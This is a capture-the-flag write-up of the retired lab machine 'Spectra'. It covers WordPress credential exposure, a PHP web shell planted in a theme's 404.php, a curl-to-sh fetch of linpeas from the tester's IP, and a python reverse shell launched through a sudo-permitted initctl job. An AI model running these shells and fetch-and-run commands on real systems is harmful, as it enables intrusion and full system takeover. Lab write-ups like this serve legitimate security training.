# Spectra

This is the write-up for the box Spectra that got retired at the 26th June 2021.
My IP address was 10.10.14.3 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.229    spectra.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/spectra.nmap 10.10.10.229
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.17.4
3306/tcp open  mysql   MySQL (unauthorized)
```

## Checking HTTP (Port 80)

The website shows the following text and has two links:
```
Issue Tracking
Until IT set up the Jira we can configure and use this for issue tracking.

Software Issue Tracker
Test
```

- _Software Issue Tracker_ forwards to _spectra.htb/main/index.php_
- _Test_ forwards to _spectra.htb/testing/index.php_

The website on _/main_ hosts a **WordPress** blog page with one post from the user _administrator_.
The website on _/testing_ hosts an index page with many files that start with _"wp-"_ and are seemingly the source files of the WordPress page.

When browsing to a PHP file, they get processed and show that there is an _"Error establishing a database connection"_.
There is a file called _wp-config.php.save_ that does not get processed and the source code can be viewed, which contains credentials for a database:
```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

After testing these credentials on the **MySQL** service on port 3306, it shows that our IP is not allowed to login:
```
mysql -h 10.10.10.229 -u devtest -p -D dev

ERROR 1130 (HY000): Host '10.10.14.3' is not allowed to connect to this MySQL server
```

Instead the password works on _/main/wp-login.php_ with the username _administrator_ and we get a login into **WordPress**.

### Exploiting WordPress

To get command execution on the box, it is possible to edit PHP files and execute arbitrary PHP code.

In this case, the PHP code in one of the themes can be modified for command execution:
```
Appearance --> Theme Editor --> Select theme to edit: Twenty Nineteen --> Select --> 404.php
```

Adding PHP code into the beginning of the file:
```
<?php system($_REQUEST['cmd']); ?>
(...)
```

Browsing to _404.php_ to test command execution with the `whoami` command:
```
http://spectra.htb/main/wp-content/themes/twentynineteen/404.php?cmd=whoami

```
It shows the user as _nginx_ and command execution works, so lets start a reverse shell connection.
After pasting the code of _php-reverse-shell.php_ from the **Laudanum** scripts into the _404.php_ file and reload it, the listener on my IP and port 9001 starts a reverse shell as the user _nginx_.

## Privilege Escalation

To get an attack surface, it is recommended to run any **Linux Enumeration script**:
```
curl 10.10.14.3/linpeas.sh | sh
```

In the file _/etc/autologin/passwd_ is a password:
> SummerHereWeCome!!

There is another user called _katie_ on the box and the password works for this user:
```
ssh katie@10.10.10.229
```

### Privilege Escalation to root

The command `sudo -l` shows that the user _katie_ can run a command with root privileges:
```
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

With [initctl](https://linux.die.net/man/8/initctl) it is possible to communicate with **Upstart** to run processes when a system starts.
The configuration files for this service are in the directory _/etc/init_.

Modifying the configuration file _/etc/init/test1.conf_ to execute a command:
```
(...)
script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid

    exec python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
(...)
```

Restarting the process _test1_:
```
sudo /sbin/initctl start test1
```

After restarting the process, the listener on my IP and port 9002 starts a reverse shell as root!
